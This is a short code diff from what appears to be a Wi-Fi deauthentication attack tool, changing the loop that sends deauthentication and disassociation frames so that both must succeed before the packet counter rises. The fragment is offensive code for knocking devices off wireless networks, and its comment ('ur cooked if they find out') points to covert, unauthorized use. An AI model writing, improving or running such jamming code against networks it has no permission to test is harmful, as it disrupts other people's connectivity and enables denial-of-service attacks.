@@ -443,7 +443,7 @@ void Deauth::start() {
 
   // send the deauth 150 times(ur cooked if they find out)
   for (int i = 0; i < packetCount; ++i) {
-    if (Deauth::send(deauthFrame, deauthFrameSize, 0) ||
+    if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
         Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
       packets++;
       float pps = packets / (float)(millis() - startTime) * 1000;
